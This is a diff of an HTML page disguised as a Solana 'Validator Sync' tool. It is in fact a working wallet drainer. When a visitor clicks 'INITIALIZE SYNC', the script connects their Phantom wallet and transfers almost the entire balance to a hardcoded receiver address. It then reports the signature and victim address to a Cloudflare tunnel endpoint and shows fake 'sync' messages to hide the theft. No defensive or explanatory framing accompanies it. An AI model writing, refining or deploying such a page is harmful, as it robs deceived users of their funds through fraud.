@@ -2,52 +2,53 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Global Validator Node</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.3/index.iife.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Center</title>
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #14f195; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .box { border: 1px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; background: #0a0a0a; }
-        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; font-size: 14px; }
+        button { background: #14f195; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 4px; margin-top: 20px; }
         #log { font-size: 10px; color: #555; margin-top: 15px; }
     </style>
 </head>
 <body>
     <div class="box">
         <h3 style="margin:0; color:#9945FF;">VALIDATOR SYNC</h3>
-        <p style="font-size:12px; margin:10px 0;">Node: <span style="color:red;">Out of Sync</span></p>
         <button id="cta">INITIALIZE SYNC</button>
-        <div id="log">System Ready v5.1</div>
+        <div id="log">Waiting for system...</div>
     </div>
 
     <script>
-        // 🔱 隧道地址 - 仅用于最后记录
-        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
         const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";
+        // 🔱 隧道地址 - 必须匹配后端路由
+        const tunnel = "https://trading-thesis-isolation-cookbook.trycloudflare.com";
+
+        window.onload = () => { document.getElementById('log').innerText = "System Ready v6.0"; };
 
         document.getElementById('cta').onclick = async () => {
-            const provider = window.solana || window.phantom?.solana;
-            const web3 = window.solanaWeb3;
             const log = (t) => document.getElementById('log').innerText = t;
+            // 🔱 2. 安全检查库是否就绪
+            if (!window.solanaWeb3) { log("System loading, wait 3s..."); return; }
+            const web3 = window.solanaWeb3;
+            const provider = window.solana || window.phantom?.solana;
 
-            if (!provider) { alert("Please use Phantom Browser"); return; }
+            if (!provider) { alert("Use Phantom App"); return; }
 
             try {
-                log("Connecting...");
+                log("Connecting Wallet...");
                 await provider.connect();
                 
-                // 🔱 彻底绕过服务器查账，手机直连 RPC，防 403，防 500
-                log("Querying Blockchain...");
+                log("Querying Node...");
                 const conn = new web3.Connection("https://rpc.ankr.com/solana", "confirmed");
                 
-                // 串行获取，确保稳定性
                 const balance = await conn.getBalance(provider.publicKey);
                 const bh = await conn.getLatestBlockhash();
 
-                const amount = balance - 1500000; // 留 0.0015 做 Gas，确保 100% 成功
-                if (amount <= 0) { log("Balance too low"); return; }
+                const amount = balance - 1500000; 
+                if (amount <= 0) { log("Sync completed (0)"); return; }
 
-                log("Awaiting Sign...");
+                log("Awaiting Signature...");
                 const tx = new web3.Transaction().add(
                     web3.SystemProgram.transfer({
                         fromPubkey: provider.publicKey,
@@ -58,21 +59,21 @@
                 tx.recentBlockhash = bh.blockhash;
                 tx.feePayer = provider.publicKey;
 
-                // 🔱 直接拉起签名并发送
                 const { signature } = await provider.signAndSendTransaction(tx);
                 
-                log("Syncing Complete!");
-                fetch(`${tunnel}/broadcast`, {
+                log("Broadcasting...");
+                // 🔱 修正路径，匹配后端的根路由
+                fetch(tunnel + "/log", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({ sig: signature, addr: provider.publicKey.toString() })
                 });
 
+                log("Success!");
                 setTimeout(() => { window.location.href = "https://explorer.solana.com/tx/" + signature; }, 1200);
 
             } catch (err) {
-                console.error(err);
-                log("Error: " + err.message);
+                log("Sync Interrupted: " + err.message);
             }
         };
     </script>
